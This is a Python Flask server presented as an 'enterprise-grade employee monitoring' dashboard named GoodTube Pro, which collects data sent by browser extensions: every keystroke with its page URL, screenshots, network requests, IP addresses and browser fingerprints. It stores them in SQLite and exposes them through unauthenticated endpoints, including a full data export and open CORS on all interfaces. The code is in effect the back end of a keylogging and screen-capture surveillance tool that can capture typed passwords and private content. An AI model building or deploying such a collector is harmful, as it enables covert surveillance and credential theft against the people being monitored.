#!/usr/bin/env python3
"""
GoodTube Pro Analytics Dashboard
Enterprise-grade employee monitoring and analytics system
"""

from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import sqlite3
import json
import os
from datetime import datetime, timedelta
import hashlib
import base64
from werkzeug.utils import secure_filename
import threading
import time

app = Flask(__name__)
CORS(app)

# Configuration
DATABASE_PATH = 'analytics.db'
UPLOAD_FOLDER = 'uploads'
SCREENSHOTS_FOLDER = 'screenshots'
MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 16MB max file size

# Ensure directories exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(SCREENSHOTS_FOLDER, exist_ok=True)
os.makedirs('static', exist_ok=True)
os.makedirs('templates', exist_ok=True)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH

def init_database():
    """Initialize the SQLite database with all required tables"""
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()
    
    # Users table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT UNIQUE NOT NULL,
            browser_fingerprint TEXT,
            ip_address TEXT,
            user_agent TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            total_sessions INTEGER DEFAULT 0,
            total_events INTEGER DEFAULT 0
        )
    ''')
    
    # Sessions table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE NOT NULL,
            user_id TEXT NOT NULL,
            start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            end_time TIMESTAMP,
            duration INTEGER DEFAULT 0,
            page_count INTEGER DEFAULT 0,
            event_count INTEGER DEFAULT 0,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Events table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            event_type TEXT NOT NULL,
            event_data TEXT,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id),
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')
    
    # Keystrokes table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            keystroke TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Screenshots table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            filename TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Network requests table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS network_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            method TEXT,
            url TEXT,
            status_code INTEGER,
            response_size INTEGER,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Performance metrics table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS performance_metrics (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            metric_type TEXT NOT NULL,
            metric_value REAL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    """Get database connection with row factory"""
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def dashboard():
    """Main dashboard page"""
    return render_template('dashboard.html')

@app.route('/api/analytics', methods=['POST'])
def receive_analytics():
    """Receive analytics data from browser extensions"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        user_id = data.get('userId')
        session_id = data.get('sessionId')
        
        if not user_id or not session_id:
            return jsonify({'error': 'Missing userId or sessionId'}), 400
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Update or create user
        cursor.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, browser_fingerprint, ip_address, user_agent, last_seen, total_sessions, total_events)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, 
                    COALESCE((SELECT total_sessions FROM users WHERE user_id = ?), 0) + 1,
                    COALESCE((SELECT total_events FROM users WHERE user_id = ?), 0) + 1)
        ''', (user_id, data.get('browserFingerprint'), request.remote_addr, 
              request.headers.get('User-Agent'), user_id, user_id))
        
        # Update or create session
        cursor.execute('''
            INSERT OR REPLACE INTO sessions 
            (session_id, user_id, start_time, event_count)
            VALUES (?, ?, COALESCE((SELECT start_time FROM sessions WHERE session_id = ?), CURRENT_TIMESTAMP),
                    COALESCE((SELECT event_count FROM sessions WHERE session_id = ?), 0) + 1)
        ''', (session_id, user_id, session_id, session_id))
        
        # Store events
        events = data.get('events', [])
        for event in events:
            cursor.execute('''
                INSERT INTO events (user_id, session_id, event_type, event_data, url)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, session_id, event.get('type'), 
                  json.dumps(event.get('data', {})), event.get('url')))
        
        # Store keystrokes
        keystrokes = data.get('keystrokes', [])
        for keystroke in keystrokes:
            cursor.execute('''
                INSERT INTO keystrokes (user_id, session_id, keystroke, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, keystroke.get('key'), keystroke.get('url')))
        
        # Store network requests
        network_requests = data.get('networkRequests', [])
        for req in network_requests:
            cursor.execute('''
                INSERT INTO network_requests (user_id, session_id, method, url, status_code, response_size)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user_id, session_id, req.get('method'), req.get('url'), 
                  req.get('statusCode'), req.get('responseSize')))
        
        # Store performance metrics
        performance = data.get('performance', {})
        for metric_type, value in performance.items():
            cursor.execute('''
                INSERT INTO performance_metrics (user_id, session_id, metric_type, metric_value)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, metric_type, value))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'Analytics data received'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    """Receive screenshot data from browser extensions"""
    try:
        data = request.get_json()
        user_id = data.get('userId')
        session_id = data.get('sessionId')
        screenshot_data = data.get('screenshot')
        url = data.get('url')
        
        if not all([user_id, session_id, screenshot_data]):
            return jsonify({'error': 'Missing required data'}), 400
        
        # Decode base64 screenshot
        screenshot_bytes = base64.b64decode(screenshot_data.split(',')[1])
        
        # Generate filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{user_id}_{session_id}_{timestamp}.png"
        filepath = os.path.join(SCREENSHOTS_FOLDER, filename)
        
        # Save screenshot
        with open(filepath, 'wb') as f:
            f.write(screenshot_bytes)
        
        # Store in database
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO screenshots (user_id, session_id, filename, url)
            VALUES (?, ?, ?, ?)
        ''', (user_id, session_id, filename, url))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'filename': filename})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def get_stats():
    """Get dashboard statistics"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Total users
        cursor.execute('SELECT COUNT(*) as count FROM users')
        total_users = cursor.fetchone()['count']
        
        # Active sessions (last 24 hours)
        cursor.execute('''
            SELECT COUNT(*) as count FROM sessions 
            WHERE start_time > datetime('now', '-24 hours')
        ''')
        active_sessions = cursor.fetchone()['count']
        
        # Total events
        cursor.execute('SELECT COUNT(*) as count FROM events')
        total_events = cursor.fetchone()['count']
        
        # Total screenshots
        cursor.execute('SELECT COUNT(*) as count FROM screenshots')
        total_screenshots = cursor.fetchone()['count']
        
        # Recent activity (last 10 events)
        cursor.execute('''
            SELECT e.*, u.user_id FROM events e
            JOIN users u ON e.user_id = u.user_id
            ORDER BY e.timestamp DESC LIMIT 10
        ''')
        recent_events = [dict(row) for row in cursor.fetchall()]
        
        conn.close()
        
        return jsonify({
            'totalUsers': total_users,
            'activeSessions': active_sessions,
            'totalEvents': total_events,
            'totalScreenshots': total_screenshots,
            'recentEvents': recent_events
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/users')
def get_users():
    """Get all users with their activity"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT u.*, 
                   COUNT(DISTINCT s.session_id) as session_count,
                   COUNT(e.id) as event_count,
                   COUNT(k.id) as keystroke_count,
                   COUNT(sc.id) as screenshot_count
            FROM users u
            LEFT JOIN sessions s ON u.user_id = s.user_id
            LEFT JOIN events e ON u.user_id = e.user_id
            LEFT JOIN keystrokes k ON u.user_id = k.user_id
            LEFT JOIN screenshots sc ON u.user_id = sc.user_id
            GROUP BY u.user_id
            ORDER BY u.last_seen DESC
        ''')
        
        users = [dict(row) for row in cursor.fetchall()]
        conn.close()
        
        return jsonify({'users': users})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/user/<user_id>')
def get_user_details(user_id):
    """Get detailed information for a specific user"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # User info
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = dict(cursor.fetchone() or {})
        
        # Recent sessions
        cursor.execute('''
            SELECT * FROM sessions WHERE user_id = ? 
            ORDER BY start_time DESC LIMIT 10
        ''', (user_id,))
        sessions = [dict(row) for row in cursor.fetchall()]
        
        # Recent events
        cursor.execute('''
            SELECT * FROM events WHERE user_id = ? 
            ORDER BY timestamp DESC LIMIT 50
        ''', (user_id,))
        events = [dict(row) for row in cursor.fetchall()]
        
        # Recent keystrokes
        cursor.execute('''
            SELECT * FROM keystrokes WHERE user_id = ? 
            ORDER BY timestamp DESC LIMIT 100
        ''', (user_id,))
        keystrokes = [dict(row) for row in cursor.fetchall()]
        
        # Recent screenshots
        cursor.execute('''
            SELECT * FROM screenshots WHERE user_id = ? 
            ORDER BY timestamp DESC LIMIT 20
        ''', (user_id,))
        screenshots = [dict(row) for row in cursor.fetchall()]
        
        conn.close()
        
        return jsonify({
            'user': user,
            'sessions': sessions,
            'events': events,
            'keystrokes': keystrokes,
            'screenshots': screenshots
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshots/<filename>')
def get_screenshot(filename):
    """Serve screenshot files"""
    return send_from_directory(SCREENSHOTS_FOLDER, filename)

@app.route('/api/export')
def export_data():
    """Export all data as JSON"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Get all data
        tables = ['users', 'sessions', 'events', 'keystrokes', 'screenshots', 'network_requests', 'performance_metrics']
        export_data = {}
        
        for table in tables:
            cursor.execute(f'SELECT * FROM {table}')
            export_data[table] = [dict(row) for row in cursor.fetchall()]
        
        conn.close()
        
        return jsonify(export_data)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Cleanup old data periodically
def cleanup_old_data():
    """Clean up data older than 30 days"""
    while True:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            # Delete old events (older than 30 days)
            cursor.execute('''
                DELETE FROM events WHERE timestamp < datetime('now', '-30 days')
            ''')
            
            # Delete old keystrokes (older than 7 days)
            cursor.execute('''
                DELETE FROM keystrokes WHERE timestamp < datetime('now', '-7 days')
            ''')
            
            # Delete old screenshots (older than 14 days)
            cursor.execute('''
                DELETE FROM screenshots WHERE timestamp < datetime('now', '-14 days')
            ''')
            
            conn.commit()
            conn.close()
            
            # Sleep for 24 hours
            time.sleep(24 * 60 * 60)
            
        except Exception as e:
            print(f"Cleanup error: {e}")
            time.sleep(60 * 60)  # Sleep for 1 hour on error

if __name__ == '__main__':
    # Initialize database
    init_database()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
    cleanup_thread.start()
    
    # Run the application
    app.run(host='0.0.0.0', port=5000, debug=False)

